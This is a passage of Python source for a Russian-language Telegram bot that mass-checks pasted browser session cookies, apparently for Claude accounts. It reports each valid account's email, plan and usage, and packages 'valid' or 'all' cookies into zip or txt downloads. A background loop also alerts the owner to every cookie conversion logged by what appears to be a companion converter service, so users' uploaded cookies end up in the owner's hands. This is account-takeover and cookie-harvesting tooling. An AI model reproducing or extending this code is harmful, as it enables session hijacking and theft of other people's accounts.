            _send_zip(chat_id, path, f"valid-cookies-{stamp}.zip", f"✅ Валидных: {n} шт.")


def handle_update(u: dict):
    msg = u.get("message")
    cb = u.get("callback_query")

    if msg:
        frm = msg.get("from", {})
        text = msg.get("text", "") or ""
        if frm.get("id") != OWNER:
            if text.startswith("/id"):
                send(frm.get("id"), f"Твой chat_id: <code>{frm.get('id')}</code>")
            return
        if text.startswith("/id"):
            send(OWNER, f"Твой chat_id: <code>{OWNER}</code>")
        elif text.startswith("/diag"):
            send(OWNER, diag_text())
        elif _looks_like_cookies(text):
            # Owner pasted cookies (one or a batch): check them all and reply.
            WORK.submit(_job_batch_check, OWNER, text)
        else:
            send(OWNER, home_text(), HOME_KB)
        return

    if cb:
        frm = cb.get("from", {})
        if frm.get("id") != OWNER:
            answer_callback(cb["id"])
            return
        data = cb.get("data", "")
        chat_id = cb["message"]["chat"]["id"]
        mid = cb["message"]["message_id"]
        try:
            if data.startswith("dl:"):
                parts = data.split(":")
                if (len(parts) == 3 and parts[1] in ("valid", "all")
                        and parts[2] in ("zip", "txt")):
                    answer_callback(cb["id"], "Собираю…")
                    WORK.submit(_job_download, "pipe", chat_id, (parts[1], parts[2]))
                    return
            if data.startswith("file:"):
                rid = int(data.split(":", 1)[1])
                answer_callback(cb["id"], "Отправляю…")
                WORK.submit(_job_file, chat_id, rid)
                return
            if data == "ck:recheck":
                answer_callback(cb["id"], "Запускаю проверку…")
                WORK.submit(_job_recheck_all, chat_id)
                return
            answer_callback(cb["id"])
            WORK.submit(_job_screen, data, chat_id, mid)
        except Exception as e:
            log(f"callback '{data}' failed: {e!r}")
            answer_callback(cb["id"], "Ошибка, см. логи")


def diag_text() -> str:
    try:
        conn = db()
        total = scalar(conn, "SELECT COUNT(*) FROM events")
        conv = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='convert'")
        chk = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check'")
        blobs = scalar(conn, "SELECT COUNT(*) FROM blobs") if _has_blob(conn) else 0
        conn.close()
        return (
            "<b>🩺 Диагностика</b>\n\n"
            f"БД: <code>{_html(DB_PATH)}</code> — доступна\n"
            f"Событий всего: <b>{fmt(total)}</b>\n"
            f"Конвертаций: <b>{fmt(conv)}</b> · проверок: <b>{fmt(chk)}</b>\n"
            f"Наборов в архиве: <b>{fmt(blobs)}</b>"
        )
    except Exception as e:
        return f"<b>🩺 Диагностика</b>\n\nОшибка БД: <code>{_html(e)}</code>"


def _seed_marker(conn, key: str, type_: str) -> int:
    cur = conn.execute("SELECT value FROM botstate WHERE key=?", (key,)).fetchone()
    if cur is not None:
        return int(cur[0])
    start = scalar(conn, "SELECT COALESCE(MAX(id),0) FROM events WHERE type=?", type_)
    set_state(conn, key, start)
    return start


def should_push_check(valid, get) -> bool:
    if valid == 1:
        return get("push_check_valid", "1") == "1"
    return get("push_check_invalid", "1") == "1"


def should_push_convert(output) -> bool:
    return not is_site_sample(output)


def push_loop():
    while True:
        try:
            conn = db()
            migrate_push_settings(conn)
            conn.commit()
            _push_kind(conn, "convert", "push_convert", "last_push_convert_id", _push_conversion)
            _push_checks(conn)
            conn.close()
        except Exception as e:
            log(f"push_loop error: {e!r}")
        time.sleep(3)


def _push_kind(conn, type_: str, setting: str, marker: str, sender) -> None:
    last = _seed_marker(conn, marker, type_)
    on = get_setting(conn, setting, "1") == "1"
    if not on:
        mx = scalar(conn, "SELECT COALESCE(MAX(id),0) FROM events WHERE type=?", type_)
        if mx != last:
            set_state(conn, marker, mx)
        return
    rows = conn.execute(
        "SELECT e.id, e.ts, e.from_fmt, e.to_fmt, e.n, e.country, e.domains, "
        "e.valid, e.reason, e.info, b.output AS output "
        "FROM events e LEFT JOIN blobs b ON b.event_id = e.id "
        "WHERE e.type=? AND e.id>? ORDER BY e.id ASC LIMIT 20",
        (type_, last),
    ).fetchall()
    for r in rows:
        try:
            if type_ == "convert" and not should_push_convert(r["output"]):
                pass
            else:
                sender(r)
        except Exception as e:
            log(f"push {type_} #{r['id']} failed: {e!r}")
        set_state(conn, marker, r["id"])


def _push_checks(conn) -> None:
    last = _seed_marker(conn, "last_push_check_id", "check")
    rows = conn.execute(
        "SELECT id, ts, valid, reason, info FROM events "
        "WHERE type='check' AND id>? ORDER BY id ASC LIMIT 20",
        (last,),
    ).fetchall()
    if not rows:
        return
    get = lambda key, default="1": get_setting(conn, key, default)
    for r in rows:
        try:
            if should_push_check(r["valid"], get):
                _push_check(r)
        except Exception as e:
            log(f"push check #{r['id']} failed: {e!r}")
        set_state(conn, marker := "last_push_check_id", r["id"])


def _push_conversion(r):
    tm = datetime.fromtimestamp(r["ts"], timezone.utc).strftime("%d.%m %H:%M")
    dom = (r["domains"] or "").split(",")[0] if r["domains"] else "—"
    send(OWNER,
         "🔄 <b>Новая конвертация</b>\n"
         f"{FORMAT_LABEL.get(r['from_fmt'], r['from_fmt'])} → "
         f"{FORMAT_LABEL.get(r['to_fmt'], r['to_fmt'])}\n"
         f"{fmt(r['n'] or 0)} строк · {_html(dom)} · {tm}\n"
         "<i>Скачать: «📥 Куки → Скачать все»</i>")


def _push_check(r):
    tm = datetime.fromtimestamp(r["ts"], timezone.utc).strftime("%d.%m %H:%M")
    if r["valid"] == 1:
        info = load_info(r)
        email = info.get("email") or "—"
        plan = info.get("plan") or "Claude"
        sess = info.get("session")
        week = info.get("weekly")
        sess_txt = f"{sess}%" if sess is not None else "—"
        week_txt = f"{week}%" if week is not None else "—"
        send(OWNER,
             "🔎 <b>Новая проверка · ✅ валидна</b>\n"
             f"План: <b>{_html(plan)}</b>\n"
             f"Email: <code>{_html(email)}</code>\n"
             f"5ч: {sess_txt} · 7д: {week_txt} · {tm}\n"
             "<i>Скачать: «📥 Куки → Скачать валидные»</i>")
    else:
        reason = REASON_LABEL.get(r["reason"] or "invalid", r["reason"] or "invalid")
        send(OWNER,
             "🔎 <b>Новая проверка · ❌ невалидна</b>\n"
             f"Причина: {reason} · {tm}")


def daily_loop():
    while True:
        try:
            now_dt = datetime.now(timezone.utc)
            if now_dt.hour == 9 and now_dt.minute < 5:
                conn = db()
                if get_setting(conn, "daily_summary", "1") == "1":
                    marker = get_state(conn, "last_daily", "")
                    tag = now_dt.strftime("%Y-%m-%d")
                    if marker != tag:
                        send(OWNER, "📅 <b>Дневная сводка</b>\n\n" + view_overview(conn).split("\n", 2)[2])
                        set_state(conn, "last_daily", tag)
                conn.close()
                time.sleep(300)
        except Exception as e:
            log(f"daily_loop error: {e!r}")
        time.sleep(60)


def main():
    conn = db()
    migrate_push_settings(conn)
    conn.commit()
    conn.close()
    threading.Thread(target=push_loop, daemon=True).start()
    threading.Thread(target=daily_loop, daemon=True).start()
    print("cc-bot polling", flush=True)

    offset = 0
    r = _api("getUpdates", {"offset": -1, "timeout": 0})
    if r.get("ok") and r.get("result"):
        offset = r["result"][-1]["update_id"] + 1

    while True:
        r = _api("getUpdates", {"offset": offset, "timeout": 50})
        if not r.get("ok"):
            time.sleep(3)
            continue
        for u in r.get("result", []):
            offset = u["update_id"] + 1
            try:
                handle_update(u)
            except Exception as e:
                log(f"handle_update error: {e!r}")


if __name__ == "__main__":
    main()
